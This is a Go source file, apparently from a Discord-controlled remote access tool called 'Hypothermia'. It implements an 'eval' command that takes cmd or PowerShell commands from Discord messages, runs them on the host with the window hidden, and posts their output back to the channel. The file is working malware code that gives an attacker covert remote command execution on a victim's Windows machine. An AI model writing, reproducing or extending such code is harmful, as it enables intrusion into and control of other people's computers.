package commands

import (
	"bytes"
	"fmt"
	"os/exec"
	"strings"
	"syscall"

	"Hypothermia/src/misc"
	"github.com/bwmarrin/discordgo"
)

const (
	evalUsage string = "([cmd/powershell] [...args]) | [shortcut]"

	evalArgsError string = "🟥 Expected 2 or more arguments."
	evalUseError  string = "🟥 Invalid argument."
	evalRunError  string = "🟥 Error in running command: "

	evalNoOutput   string = "🟨 No output from command."
	evalGoodOutput string = "🟩 Success in running command."
	evalBadOutput  string = "🟥 Failed to run command."
)

func (*EvalCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, evalArgsError+"\nUsage: "+evalUsage, m.Reference())
		return
	}

	if args[0] == "?" {
		var shortcuts string = "Shortcuts:\n\n"

		for name := range misc.CmdShortcuts {
			shortcuts += name + "\n"
		}

		for name := range misc.PsShortcuts {
			shortcuts += name + "\n"
		}

		s.ChannelMessageSendReply(m.ChannelID, shortcuts, m.Reference())
		return
	}

	cmdName := ""
	cmdArgs := &[]string{}

	if val, ok := misc.CmdShortcuts[args[0]]; ok {
		cmdName = "cmd"
		*cmdArgs = []string{"/C", val}
	} else if val, ok := misc.PsShortcuts[args[0]]; ok {
		cmdName = "powershell"
		*cmdArgs = []string{"-Command", val}
	} else if args[0] == "powershell" || args[0] == "ps" {
		if len(args) < 2 {
			s.ChannelMessageSendReply(m.ChannelID, evalArgsError+"\nUsage: "+evalUsage, m.Reference())
			return
		}

		cmdName = "powershell"
		*cmdArgs = []string{"-Command", strings.Join(args[1:], " ")}
	} else if args[0] == "cmd" {
		if len(args) < 2 {
			s.ChannelMessageSendReply(m.ChannelID, evalArgsError+"\nUsage: "+evalUsage, m.Reference())
			return
		}

		cmdName = "cmd"
		*cmdArgs = []string{"/C", strings.Join(args[1:], " ")}
	} else {
		s.ChannelMessageSendReply(m.ChannelID, evalUseError+"\nUsage: "+evalUsage, m.Reference())
		return
	}

	cmd := exec.Command(cmdName, *cmdArgs...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	var out bytes.Buffer
	cmd.Stdout = &out

	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(evalRunError+"%v", err), m.Reference())
		return
	}

	response := ""

	output := out.String()
	if output != "" {
		response += evalGoodOutput + "\n```\n" + output + "\n```"
	}

	errorOutput := stderr.String()
	if errorOutput != "" {
		response += evalBadOutput + "\n```\n" + errorOutput + "\n```"
	}

	if response == "" {
		response = evalNoOutput
	}

	if len(response) > 1900 {
		s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
			Reference: m.Reference(),
			Files: []*discordgo.File{{
				Name:        "output.txt",
				ContentType: "text/plain",
				Reader:      bytes.NewReader([]byte(response)),
			}},
		})
	} else {
		s.ChannelMessageSendReply(m.ChannelID, response, m.Reference())
	}
}

func (*EvalCommand) Name() string {
	return "eval"
}

func (*EvalCommand) Info() string {
	return "runs a command on cmd or powershell"
}

type EvalCommand struct{}
